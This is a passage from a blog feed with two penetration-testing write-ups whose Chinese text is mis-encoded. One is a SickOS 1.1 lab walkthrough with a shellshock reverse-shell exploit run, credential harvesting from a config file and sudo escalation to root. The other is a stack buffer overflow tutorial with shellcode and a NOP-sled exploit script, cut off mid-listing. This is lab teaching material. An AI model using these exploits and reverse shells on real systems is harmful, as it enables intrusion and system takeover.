host<br>rport: victim port for TCP shell binding<br>lhost: attacker host for TCP shell reversing<br>lport: attacker port for TCP shell reversing<br>pages:  specific cgi vulnerable pages (separated by comma)<br>proxy: host:port proxy<br><br>Payloads:<br>&quot;reverse&quot; (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)<br>&quot;bind&quot; (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)<br><br>Example:<br><br>./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234<br>./exploit.py payload=bind rhost=1.2.3.4 rport=1234<br><br>[......]<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py payload=reverse rhost=192.168.135.157 lhost=192.168.135.141 lport=4444 proxy=192.168.135.157:3128 pages=/cgi-bin/status/</span><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥çœ‹ç”¨æˆ·å’Œç›®å½•ä¸‹æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>sickos<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html</span><br>/bin/sh: 4: cd: can&#x27;t cd to /var/www/html<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /varwww/wolfcms</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>CONTRIBUTING.md<br>README.md<br>composer.json<br>config.php<br>docs<br>favicon.ico<br>index.php<br>public<br>robots.txt<br>wolf<br><span class="hljs-meta">$</span><span class="bash"> cat config.php</span><br>&lt;?php <br><br>// Database information:<br>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)<br>// The path can only be absolute path or :memory:<br>// For more info look at: www.php.net/pdo<br><br>// Database settings:<br>define(&#x27;DB_DSN&#x27;, &#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;);<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br>define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);<br>define(&#x27;TABLE_PREFIX&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç³»ç»Ÿç”¨æˆ·ï¼šsickos ï¼›æ•°æ®åº“è´¦å·ï¼šrootï¼Œå¯†ç ï¼šjohn@123</p><p>å°è¯•SSHæ’åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh sickos@192.168.135.157</span><br>sickos@192.168.135.157&#x27;s password: <br>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)<br>sickos@SickOs:~$ whoami<br>sickos<br>sickos@SickOs:~$ id<br>uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ° sickos ç”¨æˆ·æƒé™ï¼Œå‘ç°æ­¤ç”¨æˆ·æ‹¥æœ‰ sudo æƒé™ï¼Œç›´æ¥ sudo su ææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">sickos@SickOs:~$ sudo -l<br>[sudo] password for sickos: <br>Matching Defaults entries for sickos on this host:<br>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sickos may run the following commands on this host:<br>    (ALL : ALL) ALL<br>sickos@SickOs:~$ sudo su<br>root@SickOs:/home/sickos# whoami<br>root<br>root@SickOs:/home/sickos# ls /root<br>a0216ea4d51874464078c618298b1367.txt<br>root@SickOs:/home/sickos# cat /root/a0216ea4d51874464078c618298b1367.txt<br>If you are viewing this!!<br>ROOT!<br>You have Succesfully completed SickOS1.1.<br>Thanks for Trying<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>ç«¯å£ä»£ç†æœåŠ¡</li><li>ç›®å½•æ‰«æï¼šrobots.txt</li><li>nikto æ‰«æï¼šshellshock</li><li>wolfcmsï¼šåå°ç™»å½•é¡µé¢ã€å¼±å£ä»¤ç™»å½•ã€åå°æ–‡ä»¶ä¸Šä¼ </li><li>é…ç½®æ–‡ä»¶ï¼šæ•°æ®åº“è´¦å·å¯†ç </li><li>SSHæ’åº“</li><li>sudoææƒ</li></ol>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Buffer Overflow</title>
    <link href="/2022/07/07/CTF/Pwn/Linux-Buffer-Overflow/"/>
    <url>/2022/07/07/CTF/Pwn/Linux-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><blockquote><p><a href="https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/">https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/</a></p><p><a href="https://samsclass.info/127/proj/lbuf1.htm">https://samsclass.info/127/proj/lbuf1.htm</a></p><p><a href="https://samsclass.info/127/proj/p3-lbuf1.htm">https://samsclass.info/127/proj/p3-lbuf1.htm</a> </p></blockquote><h2 id="Disabling-ASLR"><a href="#Disabling-ASLR" class="headerlink" title="Disabling ASLR"></a>Disabling ASLR</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$ sudo su<br>[sudo] password for kali: <br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/StackOverflowtest]<br>â””â”€# echo 0 &gt; /proc/sys/kernel/randomize_va_space<br><br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/StackOverflowtest]<br>â””â”€# exit<br></code></pre></td></tr></table></figure><h2 id="Creating-a-Vulnerable-Program"><a href="#Creating-a-Vulnerable-Program" class="headerlink" title="Creating a Vulnerable Program"></a>Creating a Vulnerable Program</h2><p><strong>C æºç ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br>void main(int argc, char *argv[]) &#123;<br>    char buffer[100];<br>    strcpy(buffer, argv[1]);<br>    printf(&quot;Done!\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¼–è¯‘ã€æ‰§è¡Œï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -fno-stack-protector -z execstack -no-pie -m32 -g -o bol bol.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./bol A</span><br>Done!<br></code></pre></td></tr></table></figure><h2 id="Overflowing-the-Stack"><a href="#Overflowing-the-Stack" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span></span>               <br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol <br></code></pre></td></tr></table></figure><h2 id="Debugging-the-Program"><a href="#Debugging-the-Program" class="headerlink" title="Debugging the Program"></a>Debugging the Program</h2><blockquote><p><a href="https://www.jianshu.com/p/283b5466684b">pedaçš„ä½¿ç”¨ - ç®€ä¹¦ (jianshu.com)</a></p></blockquote><p>gdb-peda å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"> #</span><span class="bash"> gdbå¦‚æœå®‰è£…ä¸ä¸Šï¼Œå¯ä»¥æ¢æºå®‰è£…ï¼šmirrors.tuna.tsinghua.edu.cn</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt install gdb</span><br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/longld/peda.git ~/peda</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span> <br></code></pre></td></tr></table></figure><p>gdb è¿è¡Œè°ƒè¯•ï¼Œlist å¯ä»¥æŸ¥çœ‹ C è¯­è¨€æºç ï¼Œbreak æ·»åŠ æ–­ç‚¹ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol</span><br>Reading symbols from bol...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x80491ad: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>å› ä¸ºæº¢å‡ºç‚¹åœ¨ <code>strcpy()</code> å‡½æ•°ï¼Œæ‰€ä»¥åœ¨ç¬¬å…­è¡Œæ‰“æ–­ç‚¹ï¼ŒæŸ¥çœ‹æº¢å‡ºåæ ˆçš„æƒ…å†µå’Œå¯„å­˜å™¨çš„æƒ…å†µã€‚</p><h3 id="Normal-Execution"><a href="#Normal-Execution" class="headerlink" title="Normal Execution"></a>Normal Execution</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run A</span><br>Starting program: /home/kali/StackOverflowtest/bol A<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd38c --&gt; 0x4f430041 (&#x27;A&#x27;)<br>EDX: 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd0e8 --&gt; 0x0 <br>ESP: 0xffffd070 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd070 --&gt; 0x0 <br>0004| 0xffffd074 --&gt; 0x1 <br>0008| 0xffffd078 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd07c --&gt; 0x41 (&#x27;A&#x27;)<br>0016| 0xffffd080 --&gt; 0x0 <br>0020| 0xffffd084 --&gt; 0x0 <br>0024| 0xffffd088 --&gt; 0x0 <br>0028| 0xffffd08c --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x2, argv=0xffffd1a4) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd07c          0xffffd07c<br>ecx            0xffffd38c          0xffffd38c<br>edx            0xffffd07c          0xffffd07c<br>ebx            0x804c000           0x804c000<br>esp            0xffffd070          0xffffd070<br>ebp            0xffffd0e8          0xffffd0e8<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x282               [ SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd070:     0x00000000      0x00000001      0xf7ffd9d0      0x00000041<br>0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000<br>0xffffd090:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd0a0:     0x08049060      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd0b0:     0x00000002      0xf7fdc480      0x00000000      0xf7df38ce<br>0xffffd0c0:     0xf7fa73fc      0xffffffff      0x08049060      0x0804921b<br>0xffffd0d0:     0x00000002      0xffffd1a4      0xffffd1b0      0x080491ed<br>0xffffd0e0:     0xffffd100      0x00000000      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0x08049060      0x00000000      0xf7dda905<br>0xffffd100:     0x00000002      0xffffd1a4      0xffffd1b0      0xffffd134<br></code></pre></td></tr></table></figure><h3 id="Overflowing-the-Stack-1"><a href="#Overflowing-the-Stack-1" class="headerlink" title="Overflowing the Stack"></a>Overflowing the Stack</h3><p><strong>ä½¿ç”¨ 116 ä¸ª A è¿›è¡Œæµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*116)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ 112 ä¸ª A å’Œ 4 ä¸ª B è¿›è¡Œæµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 -c <span class="hljs-string">&#x27;print(&quot;A&quot;*112+&quot;B&quot;*4)&#x27;</span>)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x42424242<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>è¿”å›åœ°å€å˜æˆäº† 0x42424242ï¼ˆBBBBï¼‰</p><h2 id="Constructing-the-Exploit"><a href="#Constructing-the-Exploit" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h2><h3 id="Getshellcode"><a href="#Getshellcode" class="headerlink" title="Getshellcode"></a>Getshellcode</h3><p>For this project, I am using shellcode that spawns a â€œdashâ€ shell from this page:</p><p><a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a></p><p>The shellcode used to spawn a â€œdashâ€ shell is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"># This shellcode is <span class="hljs-number">32</span> bytes <span class="hljs-keyword">long</span>.<br>\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80<br></code></pre></td></tr></table></figure><h3 id="Nop"><a href="#Nop" class="headerlink" title="Nop"></a>Nop</h3><p>There are some imperfections in the debugger, so an exploit that works in gdb may fail in a real Linux shell. This happens because environment variables and other details may cause the location of the stack to change slightly.</p><p>The usual solution for this problem is a NOP Sledâ€”a long series of â€œ90â€ bytes, which do nothing when processed and proceed to the next instruction.</p><p>For this exploit, weâ€™ll use a 64-byte NOP Sled.</p><h3 id="Constructing-the-Exploit-1"><a href="#Constructing-the-Exploit-1" class="headerlink" title="Constructing the Exploit"></a>Constructing the Exploit</h3><p><strong>a.pyï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;1234&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-in-gdb"><a href="#Testing-Exploit-in-gdb" class="headerlink" title="Testing Exploit in gdb"></a>Testing Exploit in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 a.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xw <span class="hljs-variable">$esp</span></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0x34333231<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure><p>Choosing an Address and Inserting the Correct Address Into the Exploit</p><p><strong>b.pyï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 